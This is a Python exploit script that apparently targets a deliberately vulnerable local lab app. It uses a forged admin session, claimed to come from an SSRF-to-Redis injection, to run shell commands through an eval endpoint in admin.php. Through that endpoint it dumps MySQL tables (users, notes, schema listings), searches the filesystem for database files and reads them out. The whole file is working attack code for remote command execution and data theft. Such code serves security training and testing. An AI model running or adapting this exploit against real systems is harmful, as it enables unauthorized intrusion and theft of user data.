#!/usr/bin/env python3
"""
Database Dump via SSRF → Redis → RCE
Dumps database through the vulnerability chain
"""

import requests
import urllib.parse

def dump_database():
    print("[*] Dumping database via SSRF → RCE chain...")
    
    # Use existing admin session
    session = requests.Session()
    session.cookies.set('SID', 'admin_from_ssrf', domain='localhost', path='/')
    
    # Dump strategies:
    print("\n1. Dumping via SQL commands (if we know DB structure):")
    
    # Example: Dump users table
    sql_commands = [
        "SELECT * FROM users",
        "SELECT * FROM notes", 
        "SELECT schema_name FROM information_schema.schemata",
        "SELECT table_name FROM information_schema.tables"
    ]
    
    for sql in sql_commands:
        # URL encode the SQL
        encoded_sql = urllib.parse.quote(sql)
        cmd = f"echo '{sql}' | mysql -u root -ppassword vulnerable_db 2>/dev/null || echo 'SQL failed'"
        
        rce_url = f"http://localhost:8080/admin.php?execute=eval&cmd={urllib.parse.quote(cmd)}"
        
        print(f"\n  Executing: {sql}")
        response = session.get(rce_url, timeout=10)
        
        # Extract output
        import re
        pre_tags = re.findall(r'<pre[^>]*>(.*?)</pre>', response.text, re.DOTALL)
        if pre_tags:
            output = pre_tags[-1]
            clean = re.sub(r'<[^>]+>', '', output)
            if clean.strip():
                print(f"  Output: {clean.strip()[:100]}...")
    
    print("\n2. Dumping entire database files:")
    
    # Find and dump DB files
    dump_commands = [
        "find / -name '*.db' -o -name '*.sqlite' -o -name '*.mysql' 2>/dev/null | head -10",
        "ls -la /var/lib/mysql/ 2>/dev/null || echo 'No MySQL dir'",
        "ls -la /app/data/ 2>/dev/null || echo 'No app data dir'"
    ]
    
    for cmd in dump_commands:
        rce_url = f"http://localhost:8080/admin.php?execute=eval&cmd={urllib.parse.quote(cmd)}"
        print(f"\n  Finding DB files: {cmd}")
        response = session.get(rce_url)
        
        # Show output
        pre_tags = re.findall(r'<pre[^>]*>(.*?)</pre>', response.text, re.DOTALL)
        if pre_tags:
            output = pre_tags[-1]
            clean = re.sub(r'<[^>]+>', '', output)
            if clean.strip():
                print(f"  Found: {clean.strip()}")
                
                # If we find DB files, try to dump them
                if '.db' in clean or '.sql' in clean:
                    for file in clean.strip().split('\n'):
                        if any(ext in file for ext in ['.db', '.sqlite', '.sql']):
                            dump_cmd = f"cat '{file}' 2>/dev/null | head -50"
                            dump_url = f"http://localhost:8080/admin.php?execute=eval&cmd={urllib.parse.quote(dump_cmd)}"
                            dump_resp = session.get(dump_url)
                            
                            pre_tags = re.findall(r'<pre[^>]*>(.*?)</pre>', dump_resp.text, re.DOTALL)
                            if pre_tags:
                                dump_output = pre_tags[-1]
                                clean_dump = re.sub(r'<[^>]+>', '', dump_output)
                                if clean_dump.strip():
                                    print(f"\n    Dumping {file}:")
                                    print(f"    {clean_dump.strip()[:200]}...")
    
    print("\n" + "="*60)
    print("[✓] Database dump attempted via RCE")
    print("[✓] Complete vulnerability chain demonstrated:")
    print("    1. SSRF → Redis Injection")
    print("    2. Admin Session Creation")  
    print("    3. Remote Code Execution")
    print("    4. Database Information Extraction")
    print("="*60)

if __name__ == "__main__":
    dump_database()